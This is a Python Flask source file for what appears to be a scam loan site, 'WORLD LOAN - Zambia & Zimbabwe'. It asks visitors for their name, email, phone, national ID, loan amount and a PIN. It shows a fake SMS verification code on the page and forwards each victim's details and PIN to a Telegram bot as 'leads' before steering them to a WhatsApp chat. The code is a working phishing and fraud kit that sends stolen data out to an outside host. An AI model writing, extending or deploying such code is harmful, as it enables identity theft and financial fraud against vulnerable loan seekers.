import os, random
from flask import Flask, request, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "pin-fix-final"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WA = "https://wa.me/message/CFCJWLOZ7IWZK1"
IMG = "https://i.postimg.cc/N001FyNh/IMG-20261025-WA7135.jpg"

@app.route('/')
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
def api():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = "WLD-" + str(random.randint(1000,9999))
        session['otp'] = otp
        session['name'] = request.form.get('full_name')
        session['email'] = request.form.get('email')
        session['phone'] = request.form.get('phone')
        session['amount'] = request.form.get('amount')
        session['country'] = request.form.get('country')
        session['pin'] = request.form.get('pin')
        session['ref'] = ref
        try:
            txt = "NEW LEAD " + session['country'] + " | OTP " + otp + " | Name " + session['name'] + " | Email " + session['email'] + " | Phone " + session['phone'] + " | Amt " + session['amount'] + " | PIN " + session['pin']
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt})
        except:
            pass
        html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:20px}.box{background:white;max-width:400px;margin:50px auto;padding:25px;border-radius:15px;text-align:center}.big{font-size:32px;background:#e8f5e9;padding:14px;border-radius:10px;color:#0a7a3e;font-weight:bold;border:2px dashed #0a7a3e}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2>SMS Sent to PHONE</h2><p>MAIL</p><div class='big'>CODE</div><form method='POST' action='/verify'><input name='otp' placeholder='Enter code' required style='width:100%;padding:14px;font-size:20px;text-align:center;margin-top:15px'><button style='width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:12px;font-weight:bold'>Verify & Continue</button></form></div></body></html>"
        html = html.replace("PHONE", session['phone']).replace("MAIL", session['email']).replace("CODE", otp).replace("IMG", IMG)
        return html

    html2 = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:title' content='WORLD LOAN Zambia Zimbabwe'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:420px;margin:auto;padding:20px;border-radius:15px}input,select{width:100%;padding:12px;margin:7px 0;border:1px solid #ccc;border-radius:8px}button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-weight:bold}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2 style='text-align:center;color:#0a7a3e'>WORLD LOAN - Zambia & Zimbabwe</h2><form method='POST'><input name='full_name' placeholder='Full Name' required><input name='email' type='email' placeholder='Email' required><select name='country' required><option value='Zambia'>Zambia</option><option value='Zimbabwe'>Zimbabwe</option></select><input name='phone' placeholder='Phone +260 / +263' required><input name='id_number' placeholder='NRC ID' required><input name='county' placeholder='City Lusaka Harare' required><input name='amount' placeholder='Amount ZMW USD' required><select name='period'><option>7 Days</option><option>14 Days</option><option>30 Days</option></select><input name='pin' placeholder='Create 4-digit PIN' required><button>Submit & Get WhatsApp Access</button></form></div></body></html>"
    html2 = html2.replace("IMG", IMG)
    return html2

@app.route('/verify', methods=['POST'])
def verify():
    if request.form.get('otp') == session.get('otp'):
        ref = session.get('ref')
        country = session.get('country')
        try:
            txt2 = "VERIFIED " + country + " " + ref + " | Name " + session.get('name') + " | Email " + session.get('email') + " | Phone " + session.get('phone') + " | Amt " + session.get('amount') + " | PIN " + session.get('pin') + " | Ready to chat"
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt2})
        except:
            pass
        fh = "<html><body><div style='max-width:400px;margin:40px auto;background:white;padding:25px;border-radius:15px;text-align:center;font-family:Arial'><img src='IMG' style='width:100%;border-radius:12px'><h2>Approved REF</h2><p>COUNTRY approved - MAIL</p><p>PIN: PINCODE</p><a href='LINK' style='display:block;padding:16px;background:#25D366;color:white;border-radius:10px;text-decoration:none;font-weight:bold'>CHAT ON WHATSAPP NOW</a></div></body></html>"
        fh = fh.replace("REF", ref).replace("COUNTRY", country).replace("MAIL", session.get('email')).replace("PINCODE", session.get('pin')).replace("IMG", IMG).replace("LINK", WA)
        session.clear()
        return fh
    return "Wrong code <a href='/api'>Try Again</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
